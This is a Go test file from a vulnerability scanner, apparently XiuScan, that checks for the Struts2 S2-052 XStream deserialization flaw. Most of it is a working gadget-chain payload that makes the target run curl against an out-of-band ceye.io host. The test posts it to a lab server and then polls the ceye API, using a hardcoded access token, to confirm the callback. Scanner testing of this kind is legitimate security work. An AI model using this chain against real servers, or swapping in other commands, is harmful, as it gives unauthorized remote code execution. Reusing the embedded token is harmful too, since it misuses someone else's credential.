package test

import (
	"fmt"
	"github.com/EmYiQing/XiuScan/core/http"
	"github.com/EmYiQing/XiuScan/core/tool"
	"github.com/EmYiQing/XiuScan/log"
	"strings"
	"testing"
)

func TestS2052(t *testing.T) {
	payload := `<map>
  <entry>
    <jdk.nashorn.internal.objects.NativeString>
      <flags>0</flags>
      <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
        <dataHandler>
          <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
            <is class="javax.crypto.CipherInputStream">
              <cipher class="javax.crypto.NullCipher">
                <initialized>false</initialized>
                <opmode>0</opmode>
                <serviceIterator class="javax.imageio.spi.FilterIterator">
                  <iter class="javax.imageio.spi.FilterIterator">
                    <iter class="java.util.Collections$EmptyIterator"/>
                    <next class="java.lang.ProcessBuilder">
                      <command>
                        <string>curl</string>
                        <string>__cmd__</string>
                      </command>
                      <redirectErrorStream>false</redirectErrorStream>
                    </next>
                  </iter>
                  <filter class="javax.imageio.ImageIO$ContainsFilter">
                    <method>
                      <class>java.lang.ProcessBuilder</class>
                      <name>start</name>
                      <parameter-types/>
                    </method>
                    <name>foo</name>
                  </filter>
                  <next class="string">foo</next>
                </serviceIterator>
                <lock/>
              </cipher>
              <input class="java.lang.ProcessBuilder$NullInputStream"/>
              <ibuffer></ibuffer>
              <done>false</done>
              <ostart>0</ostart>
              <ofinish>0</ofinish>
              <closed>false</closed>
            </is>
            <consumed>false</consumed>
          </dataSource>
          <transferFlavors/>
        </dataHandler>
        <dataLen>0</dataLen>
      </value>
    </jdk.nashorn.internal.objects.NativeString>
    <jdk.nashorn.internal.objects.NativeString reference="../jdk.nashorn.internal.objects.NativeString"/>
  </entry>
  <entry>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
    <jdk.nashorn.internal.objects.NativeString reference="../../entry/jdk.nashorn.internal.objects.NativeString"/>
  </entry>
</map>`
	randStr := tool.GetRandomLetter(20)
	url := "http://772m76.ceye.io/" + randStr
	payload = strings.ReplaceAll(payload, "__cmd__", url)
	output := strings.ReplaceAll(payload, "\n", "\\n")
	output = strings.ReplaceAll(output, " ", "%20")
	output = tool.FormatPayload(output)
	log.Info("payload: %s", output)
	headers := make(map[string]string)
	headers["Content-Type"] = "application/xml"
	req := &http.Request{
		Url:     http.NewUrl("http://192.168.222.132:8080/orders/3/edit"),
		Method:  "POST",
		Headers: headers,
		Body:    payload,
	}
	http.DoRequest(req)
	resp := http.Get("http://api.ceye.io/v1/records?token=59408d12c25f5163ae82409e76ef4898&type=http&filter=" + randStr)
	if strings.Contains(string(resp.Body), randStr) {
		fmt.Println(string(resp.Body))
		log.Info("find S2-052")
	}
}
